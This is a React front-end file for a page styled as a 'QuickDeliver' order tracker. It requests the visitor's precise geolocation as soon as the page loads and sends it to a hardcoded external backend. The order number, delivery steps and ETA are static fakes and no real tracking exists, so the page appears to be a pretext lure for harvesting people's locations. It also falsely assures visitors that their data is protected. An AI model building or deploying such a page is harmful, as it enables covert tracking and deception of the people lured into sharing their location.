import React, { useEffect, useState } from 'react';
import './App.css';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL || 'https://location-backend-3cdl.onrender.com';

function App() {
  const [status, setStatus] = useState('idle');
  const [coords, setCoords] = useState(null);
  const [errorMsg, setErrorMsg] = useState('');

  useEffect(() => {
    captureLocation();
  }, []);

  const captureLocation = () => {
    setStatus('loading');
    if (!navigator.geolocation) {
      setStatus('error');
      setErrorMsg('Geolocation is not supported by your browser.');
      return;
    }
    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        setCoords({ latitude, longitude, accuracy });
        try {
          const res = await fetch(`${BACKEND_URL}/api/location`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy }),
          });
          if (!res.ok) throw new Error('Server error');
          setStatus('success');
        } catch (err) {
          console.error('Backend error:', err);
          setStatus('error');
          setErrorMsg('Could not send location to server. Try again.');
        }
      },
      (err) => {
        if (err.code === err.PERMISSION_DENIED) {
          setStatus('denied');
          setErrorMsg('Location permission denied. Please allow location access.');
        } else {
          setStatus('error');
          setErrorMsg('Unable to retrieve your location.');
        }
      },
      { enableHighAccuracy: true, timeout: 15000 }
    );
  };

  return (
    <div className="app">
      {/* Header */}
      <header className="header">
        <div className="logo">
          <span className="logo-icon">🛵</span>
          <span className="logo-text">QuickDeliver</span>
        </div>
        <nav className="nav">
          <a href="#track">Track Order</a>
          <a href="#help">Help</a>
        </nav>
      </header>

      {/* Hero */}
      <section className="hero">
        <div className="hero-content">
          <div className="badge">⚡ Fast Delivery</div>
          <h1>Your order is<br /><span className="highlight">on the way!</span></h1>
          <p className="subtitle">
            We need your location to deliver your order accurately and on time.
          </p>

          {/* Location Status Card */}
          <div className={`location-card ${status}`}>
            {status === 'loading' && (
              <div className="status-row">
                <div className="spinner" />
                <span>Detecting your location...</span>
              </div>
            )}
            {status === 'success' && (
              <div className="status-row">
                <span className="status-icon">✅</span>
                <div>
                  <strong>Location captured!</strong>
                  <p className="coords">
                    📍 {coords?.latitude?.toFixed(5)}, {coords?.longitude?.toFixed(5)}
                  </p>
                </div>
              </div>
            )}
            {(status === 'error' || status === 'denied') && (
              <div className="status-row">
                <span className="status-icon">❌</span>
                <div>
                  <strong>{status === 'denied' ? 'Permission Denied' : 'Error'}</strong>
                  <p className="coords">{errorMsg}</p>
                  <button className="retry-btn" onClick={captureLocation}>Retry</button>
                </div>
              </div>
            )}
            {status === 'idle' && (
              <div className="status-row">
                <span className="status-icon">📍</span>
                <span>Waiting for location...</span>
              </div>
            )}
          </div>

          <button className="cta-btn" onClick={captureLocation}>
            📦 Share My Location & Track Order
          </button>
        </div>

        <div className="hero-visual">
          <div className="delivery-card">
            <div className="delivery-header">
              <span>Order #DL-2847</span>
              <span className="badge-green">On the way</span>
            </div>
            <div className="delivery-steps">
              <div className="step done">✅ Order Placed</div>
              <div className="step done">✅ Packed</div>
              <div className="step active">🛵 Out for Delivery</div>
              <div className="step">📦 Delivered</div>
            </div>
            <div className="eta">Estimated: 15–20 mins</div>
          </div>
        </div>
      </section>

      {/* Features */}
      <section className="features">
        <div className="feature-card">
          <span>⚡</span>
          <h3>Express Delivery</h3>
          <p>Get your order in under 30 minutes</p>
        </div>
        <div className="feature-card">
          <span>📍</span>
          <h3>Live Tracking</h3>
          <p>Real-time updates on your delivery</p>
        </div>
        <div className="feature-card">
          <span>🔒</span>
          <h3>Secure & Safe</h3>
          <p>Your data is encrypted and protected</p>
        </div>
      </section>

      <footer className="footer">
        <p>© 2026 QuickDeliver. All rights reserved.</p>
      </footer>
    </div>
  );
}

export default App;
